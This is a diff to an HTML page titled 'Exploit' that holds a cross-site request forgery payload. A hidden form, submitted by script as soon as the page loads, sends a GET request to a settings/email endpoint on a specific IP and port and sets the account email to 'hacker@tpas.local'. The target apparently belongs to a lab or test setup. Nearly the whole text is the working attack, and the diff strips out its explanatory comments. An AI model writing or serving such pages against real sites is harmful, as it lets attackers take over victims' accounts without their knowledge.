@@ -5,13 +5,16 @@
     <title>Exploit</title>
 </head>
 <body>
-    <!-- A GET form forces a clean top-level browser navigation to the target -->
-    <form id="exploitForm" action="http://100.101.228" method="GET">
-        <input type="hidden" name="new" value="hacker@tpas.local">
+    <form id="exploitForm"
+          action="http://100.101.228.35:6009/settings/email"
+          method="GET">
+
+        <input type="hidden"
+               name="new"
+               value="hacker@tpas.local">
     </form>
 
     <script>
-        // Auto-submits the form immediately upon loading
         document.getElementById('exploitForm').submit();
     </script>
 </body>
